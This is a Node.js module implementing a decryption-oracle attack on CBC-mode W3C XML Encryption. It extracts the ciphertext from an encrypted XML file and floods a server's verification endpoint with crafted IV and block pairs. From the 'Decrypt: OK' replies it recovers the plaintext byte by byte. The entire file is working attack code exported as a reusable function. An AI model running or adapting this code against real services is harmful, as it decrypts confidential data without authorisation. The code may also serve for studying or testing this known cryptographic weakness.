var fs = require('fs');
var assert = require('assert');
var http = require('http');
var async = require('async');
var assert = require('assert');



var port;
var verify;
var encrypt;
var host;
var encryptedXMLPrefix;
var encryptedXMLSubfix;
var v = 16; //16bytes per block


//post encrypted xml to oracle for verify, callback with true if passed, otherwise false
var verifyOracle = function (data, cb) {

    var httpOptions = {
      host: host,
      port: port,
      path: verify,
      method: 'POST',
      headers: {
        'Content-Type': 'text/xml',
        'Content-Length': data.length
      }
    };
    var ret = false;

    var req = http.request(httpOptions, function(res) {
      res.setEncoding('ascii');
      var fullBody = '';

      res.on('data', function(chunk) {
        // append the current chunk of data to the fullBody variable
        fullBody += chunk.toString();
      });

      res.on('end', function() {
        if (fullBody === 'Decrypt: OK\r\n') {
          ret = true;
        } else {
          ret = false;
        }
        cb(ret);
      });
    });

    req.write(data);
    req.end();
    return ret;
}

//construct a one block encrypted xml and post to verify,
//callback with true if passed, other wise flase
function sendBlock2Verify(iv, block, cb) {
  var cipher = Buffer.concat([iv, block]);
  var cipherString = encryptedXMLPrefix + cipher.toString('Base64')+ encryptedXMLSubfix;
  verifyOracle(cipherString, cb);
}



//input ane encrypted xml file path, plain text return in callback
function recoverEncryted2PlainXML(encryptedXMLFile, oracle, callback) {

  port = oracle.port;
  verify = oracle.verification_path;
  encrypt = oracle.encryption_path;
  host = oracle.host;
  var encryptedXMLStr =  fs.readFileSync(encryptedXMLFile).toString();
  verifyOracle(encryptedXMLStr, function(result) {
    if (result === false) {
      callback("format err on encrypted XML", null);
    } else {
      var regex = '[.\n\r]*<xenc:CipherValue>(.+?)<\/xenc:CipherValue>[.\n\r]*';

      assert.notEqual(encryptedXMLStr.match(regex), undefined, "ciphertext regex not match");

      var cipherStr = encryptedXMLStr.match(regex)[1];
      var cipherStartIndex = encryptedXMLStr.indexOf(cipherStr);
      encryptedXMLPrefix = encryptedXMLStr.slice(0, cipherStartIndex);
      encryptedXMLSubfix = encryptedXMLStr.slice(cipherStartIndex + cipherStr.length);
      var cipher = new Buffer(cipherStr, 'Base64');
      recoverCipher2Plain(cipher, callback);
    }
  });
}

function recoverCipher2Plain(cipher, callback) {
  // blockNum includes iv
  var blockNum = cipher.length/v;
  var plain;
  var blocks = fillArrayWithNumbers(blockNum);

  async.map(blocks.slice(1), function(i, cb){
    findIV(cipher, i, function(iv, blockCipher){
      var bitArr = fillArrayWithNumbers(v);
      async.map(bitArr,
        function (item, done){
          findXbyte(iv, blockCipher, item, done);
        },
        function (err, results) {
          var plainBlock = new Buffer(v);
          for (var k = 0; k < v - 1; k++) {
            if (iv[k] != cipher[(i-1)*v + k]) {
              plainBlock[k] = results[k] ^ 0x41;
            } else {
              plainBlock[k] = results[k];
            }
          }
          plainBlock[v - 1] = results[v - 1] ^ cipher[i*v - 1];
          cb(null, plainBlock);
        }
      );
    });
  },
  function (err, results) {
    var plainBuffer = Buffer.concat(results);
    var padding = plainBuffer[plainBuffer.length - 1];
    plain = plainBuffer.toString('ascii', 0, plainBuffer.length - padding);
    callback(err, plain);
  });
}


// first remove invalid char in block
// find iv makes padding length === 1
function findIV(cipher, blockNum, cb) {

  var iv = new Buffer(v);
  var blockC = new Buffer(v);
  cipher.copy(iv, 0, (blockNum - 1)*v, blockNum*v);
  cipher.copy(blockC, 0, blockNum*v, (blockNum + 1)*v);

  var paddingSet = [];
  var masks = fillArrayWithNumbers(0x7f + 1);
  async.doUntil(
      function getValidPaddingMasks(callback) {
        paddingSet = [];
        async.each(masks,
          function (item, done) {
            var tmpIV = new Buffer(v);
            iv.copy(tmpIV);
            tmpIV[v-1] ^= item;
            sendBlock2Verify(tmpIV, blockC, function (result) {
              if (result === true)
                paddingSet.push(tmpIV[v-1]);
              done();
            });
          },
          function (err) {
            callback();
          }
        );
      },
      function() {
        if (paddingSet.length === v) {
          return true
        } else {
          iv[paddingSet.length - 1] ^= 0x41;
        }
      },
      function (err) {
        var newIV = getValidPaddingMasks01(iv, paddingSet);
        cb(newIV, blockC);
      }
  );
}


//return an array [0, 1, 2, 3, ..., n]
function fillArrayWithNumbers(n) {
  var arr = Array.apply(null, Array(n));
  return arr.map(function (x, i) { return i });
}


function getValidPaddingMasks01(iv, pSet) {
  var setOne = [];
  var setTwo = [];
  var p;
  for (padding in pSet) {
    if (pSet[padding] & 0x10) {
      setOne.push(pSet[padding]);
    } else {
      setTwo.push(pSet[padding]);
    }
  }
  if (setOne.length === 1) {
    p = setOne[0];
  } else {
    p = setTwo[0];
  }
  iv[v-1] = p ^ 0x11;
  return iv;
}

//find j byte in blockC
function findXbyte(iv, blockC, j, callback) {
  if (j === v - 1) {
    callback(null, iv[v-1]^0x01);
  } else {
    testXbyteCase1(iv, blockC, j, 0x00, function(aSet, xByte) {
      switch (aSet.length) {
        case 1:
          // 0x?9, 0x?A, 0x?D
          callback(null, xByte);
          break;
        case 2:
          // 0x?1, 0x?2, 0x?3, 0x?4, 0x?5, 0x?7, 0x?8, 0x?B 0x?E 0x?F
          testXbyteCase1(iv, blockC, j, 0x09^aSet[0], function(bSet, xByte) {
            if (bSet.length === 1) {
              callback(null, xByte);
            } else {
              testXbyteCase1(iv, blockC, j, 0x08^aSet[0], function(bSet, xByte) {
                if (bSet.length === 1) {
                  callback(null, xByte);
                } else {
                  testXbyteCase1(iv, blockC, j, 0x01^aSet[0], function(bSet, xByte) {
                    if (bSet.length === 1) {
                      callback(null, xByte);
                    } else {
                      testXbyteCase1(iv, blockC, j, 0x0E^aSet[0], function(bSet, xByte) {
                        if (bSet.length === 1) {
                          callback(null, xByte);
                        } else {
                          testXbyteCase1(iv, blockC, j, 0x07^aSet[0], function(bSet, xByte) {
                            if (bSet.length === 1) {
                              callback(null, xByte);
                            } else {
                              testXbyteCase1(iv, blockC, j, 0x06^aSet[0], function(bSet, xByte) {
                                assert.equal(bSet.length, 1);
                                callback(null, xByte);
                              });
                            }
                          });
                        }
                      });
                    }
                  });
                }
              });
            }
          });
          break;
        case 3:
          testXbyteCase1(iv, blockC, j, 0x05^aSet[0], function(bSet, xByte) {
            if (bSet.length === 1) {
              callback(null, xByte);
            } else {
              testXbyteCase1(iv, blockC, j, 0x0F^aSet[0], function(bSet, xByte) {
                assert.equal(bSet.length, 1);
                callback(null, xByte);
              });
            }
          });
          break;
        default:
          break;
      }
    });
  }
}

function testXbyteCase1(iv, blockC, j, mskInput, cb) {
  var originMsk = [0x00, 0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70];
  var mskForC1 = [0x25, 0x26, 0x21];
  var msk = originMsk.map(function(x){return x^mskInput});
  testXbyte(iv, blockC, j, msk, function(aSet) {
    if (aSet.length === 1) {
        testXbyte(iv, blockC, j, mskForC1.map(function(x){return x^aSet[0]}), function(bSet) {
          assert.equal(bSet.length, 1);
          cb(aSet, 0x3C ^ bSet[0]);
        });
    } else
      cb(aSet, null);
  });
}


function testXbyte(iv, blockC, j, msk, cb) {
  var aSet = [];
  async.each(msk,
    function(item, done) {
      var tmpIV = new Buffer(v);
      iv.copy(tmpIV);
      tmpIV[j] ^= item;
      tmpIV[v - 1] ^= 0x01 ^ (v - j - 1);
      sendBlock2Verify(tmpIV, blockC, function (result) {
        if (result === false)
          aSet.push(item);
        done();
      });
    },
    function(err) {
      cb(aSet);
    }
  );
}

exports = module.exports = {
  recoverEncryted2PlainXML: recoverEncryted2PlainXML
};
